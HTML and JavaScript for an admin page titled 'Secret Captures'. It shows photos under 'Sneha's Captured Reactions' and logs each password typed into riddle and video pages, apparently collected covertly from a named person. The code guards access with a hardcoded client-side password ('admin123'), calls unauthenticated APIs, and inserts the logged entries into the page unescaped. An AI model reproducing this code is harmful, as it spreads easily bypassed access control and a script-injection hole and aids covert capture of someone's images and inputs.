<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Secret Captures</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #121212;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #d81b60;
        }
        #login-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 80vh;
        }
        input {
            padding: 10px;
            font-size: 1.2rem;
            border-radius: 5px;
            border: none;
            margin-bottom: 10px;
            text-align: center;
        }
        button {
            padding: 10px 20px;
            font-size: 1.2rem;
            border-radius: 5px;
            background: #d81b60;
            color: white;
            border: none;
            cursor: pointer;
        }
        #dashboard { display: none; }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        .gallery-item {
            background: #1e1e1e;
            border-radius: 10px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
        }
        .gallery-item img {
            width: 100%;
            height: 250px;
            object-fit: cover;
            background: #000;
        }
        .gallery-item p {
            text-align: center;
            padding: 10px;
            margin: 0;
            font-size: 0.9rem;
            color: #bbb;
        }
        #no-photos {
            text-align: center;
            font-size: 1.5rem;
            color: #888;
            margin-top: 50px;
            display: none;
        }
    </style>
</head>
<body>

    <div id="login-screen">
        <h1>Admin Control Panel</h1>
        <input type="password" id="admin-pass" placeholder="Admin Password">
        <button onclick="login()">Enter</button>
        <p id="error" style="color:red; display:none; margin-top:10px;">Incorrect Password</p>
    </div>

    <div id="dashboard">
        <h1>Sneha's Captured Reactions 📸</h1>
        <div style="text-align: center; margin-bottom: 20px;">
            <button onclick="fetchAll()">Refresh All Data</button>
        </div>
        
        <div class="gallery-section">
            <h2 style="color: #ff80ab; border-bottom: 1px solid #333; padding-bottom: 10px;">Photos Captured</h2>
            <p id="no-photos">No photos captured yet.</p>
            <div class="gallery" id="photo-gallery"></div>
        </div>

        <div class="attempts-section" style="margin-top: 50px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
            <div>
                <h2 style="color: #ff80ab; border-bottom: 1px solid #333; padding-bottom: 10px;">Riddle Attempts 🔑</h2>
                <div style="background: #1e1e1e; border-radius: 10px; padding: 15px; max-height: 400px; overflow-y: auto;">
                    <table style="width: 100%; border-collapse: collapse; text-align: left;">
                        <thead>
                            <tr style="color: #bbb; border-bottom: 1px solid #444;">
                                <th style="padding: 10px;">Time</th>
                                <th style="padding: 10px;">Password</th>
                            </tr>
                        </thead>
                        <tbody id="riddle-attempts-list"></tbody>
                    </table>
                    <p id="no-riddle-attempts" style="text-align: center; color: #888; margin-top: 20px;">No riddle attempts.</p>
                </div>
            </div>
            <div>
                <h2 style="color: #fb8c00; border-bottom: 1px solid #333; padding-bottom: 10px;">Video Attempts 🎥</h2>
                <div style="background: #1e1e1e; border-radius: 10px; padding: 15px; max-height: 400px; overflow-y: auto;">
                    <table style="width: 100%; border-collapse: collapse; text-align: left;">
                        <thead>
                            <tr style="color: #bbb; border-bottom: 1px solid #444;">
                                <th style="padding: 10px;">Time</th>
                                <th style="padding: 10px;">Password</th>
                            </tr>
                        </thead>
                        <tbody id="video-attempts-list"></tbody>
                    </table>
                    <p id="no-video-attempts" style="text-align: center; color: #888; margin-top: 20px;">No video attempts.</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        function login() {
            const pass = document.getElementById('admin-pass').value;
            if (pass === 'admin123') { 
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                fetchAll();
            } else {
                document.getElementById('error').style.display = 'block';
            }
        }

        function fetchAll() {
            fetchPhotos();
            fetchAttempts();
        }

        async function fetchAttempts() {
            try {
                const res = await fetch('/api/attempts');
                const data = await res.json();
                
                const riddleList = document.getElementById('riddle-attempts-list');
                const videoList = document.getElementById('video-attempts-list');
                const noRiddle = document.getElementById('no-riddle-attempts');
                const noVideo = document.getElementById('no-video-attempts');
                
                riddleList.innerHTML = '';
                videoList.innerHTML = '';
                
                let riddleCount = 0;
                let videoCount = 0;

                if (data.attempts && data.attempts.length > 0) {
                    data.attempts.forEach(att => {
                        const tr = document.createElement('tr');
                        tr.style.borderBottom = '1px solid #333';
                        tr.innerHTML = `
                            <td style="padding: 10px; color: #bbb; font-size: 0.85rem;">${att.timestamp}</td>
                            <td style="padding: 10px; font-weight: bold; color: ${att.type === 'video' ? '#fb8c00' : '#ffeb3b'};">${att.password}</td>
                        `;
                        
                        if (att.type === 'video') {
                            videoList.appendChild(tr);
                            videoCount++;
                        } else {
                            riddleList.appendChild(tr);
                            riddleCount++;
                        }
                    });
                }
                
                noRiddle.style.display = riddleCount > 0 ? 'none' : 'block';
                noVideo.style.display = videoCount > 0 ? 'none' : 'block';

            } catch (err) { console.error(err); }
        }


        async function fetchPhotos() {
            try {
                const res = await fetch('/api/captures');
                const data = await res.json();
                
                const gallery = document.getElementById('photo-gallery');
                gallery.innerHTML = '';
                
                if (data.files && data.files.length > 0) {
                    document.getElementById('no-photos').style.display = 'none';
                    data.files.forEach(filename => {
                        const item = document.createElement('div');
                        item.className = 'gallery-item';
                        
                        const img = document.createElement('img');
                        img.src = '/captures/' + filename + '?t=' + new Date().getTime();
                        
                        const label = document.createElement('p');
                        label.innerText = filename;
                        
                        item.appendChild(img);
                        item.appendChild(label);
                        gallery.appendChild(item);
                    });
                } else {
                    document.getElementById('no-photos').style.display = 'block';
                }
            } catch (err) {
                console.error("Failed to fetch photos", err);
            }
        }
    </script>
</body>

</html>
